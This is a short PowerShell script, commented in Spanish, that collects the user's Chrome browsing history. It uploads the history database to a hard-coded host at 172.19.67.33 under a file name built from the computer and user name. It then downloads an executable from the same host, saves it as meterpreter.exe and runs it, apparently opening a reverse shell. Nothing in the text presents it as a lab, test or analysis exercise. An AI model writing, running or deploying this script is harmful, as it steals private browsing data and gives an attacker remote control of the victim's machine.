# ========================
# Recolección de historial 
# ========================
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$computerName = $env:COMPUTERNAME
$username = $env:USERNAME

$histPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempHist = "$env:TEMP\history_copy.sqlite"

if (Test-Path $histPath) {
    Copy-Item $histPath $tempHist -Force

    # Enviar archivo SQLite como binario
    $histFileName = "historial_${computerName}_${username}_$timestamp.sqlite"
    Invoke-WebRequest -Uri "http://172.19.67.33:8080/upload?file=$histFileName" -Method POST -InFile $tempHist -UseBasicParsing
}

Invoke-WebRequest -Uri "http://172.19.67.33:8000/reverse.exe" -OutFile "$env:TEMP\meterpreter.exe"
Start-Process "$env:TEMP\meterpreter.exe"
exit
